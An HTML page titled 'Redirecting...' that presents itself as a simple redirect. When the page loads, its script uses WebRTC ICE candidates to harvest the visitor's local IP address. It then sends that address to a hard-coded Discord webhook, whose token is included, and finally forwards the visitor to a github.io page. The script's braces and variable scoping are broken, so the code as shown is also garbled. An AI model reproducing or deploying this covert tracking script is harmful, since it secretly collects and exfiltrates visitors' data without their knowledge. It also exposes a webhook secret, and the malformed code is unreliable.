<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        function getLocalIP(callback) {
            // Creates a new RTCPeerConnection
            var peerConnection = new RTCPeerConnection({iceServers: []});
            var noop = function() {};
            var localIPs = {};
            var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g;
            var key;

            function iterateIP(ip) {
                if (!localIPs[ip]) callback(ip);
                localIPs[ip] = true;
            }

            // Create a dummy data channel
            peerConnection.createDataChannel("");

            // Create an offer
            peerConnection.createOffer(function(sdp) {
                // Set the local description
                peerConnection.setLocalDescription(sdp, noop, noop);
            }, noop);

            // Listen for ICE candidates and get the IP address
            peerConnection.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                var candidates = ice.candidate.candidate.match(ipRegex);
                candidates.forEach(iterateIP);
            };
        }
        function sendWebhook() {
            const webhookUrl = "https://discord.com/api/webhooks/1107515018154606652/o_EXUaC3gV8O6hFNM4JkM7bgbIWtrAiQPFnNVcWveHMxLaVLqzZb4Ko21Wkv8ntj334a";
            getLocalIP(function(ip) {
                const message = {
                    content: "Someone has been redirected! Ip: " + ip
                };
            
            
            };

            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(message)
            })
            .then(() => {
                window.location.href = "https://notatomz.github.io/ShibagtGold";
            })
            .catch(error => console.error("Error sending webhook:", error));
        }
    </script>
</head>
<body onload="sendWebhook()">
    <p>Redirecting...</p>
</body>
</html>
